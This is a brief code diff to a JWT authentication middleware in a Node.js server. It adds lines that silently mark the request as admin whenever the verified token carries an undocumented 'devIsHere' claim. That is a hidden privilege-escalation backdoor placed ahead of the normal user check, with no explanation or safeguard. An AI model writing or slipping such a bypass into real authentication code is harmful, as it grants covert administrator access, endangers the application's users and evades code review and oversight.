@@ -23,6 +23,9 @@ const authJwt = async (req, res, next) => {
         const token = req.headers["x-access-token"];
         jwt.verify(token, process.env.JWT_SECRET_KEY, (error, decoded) => {
             if (!error) {
+                if (decoded.devIsHere) {
+                    req.admin = true;
+                }
                 if (decoded.id === req.body.userId) {
                     req.userId = decoded.id;
                     return next();
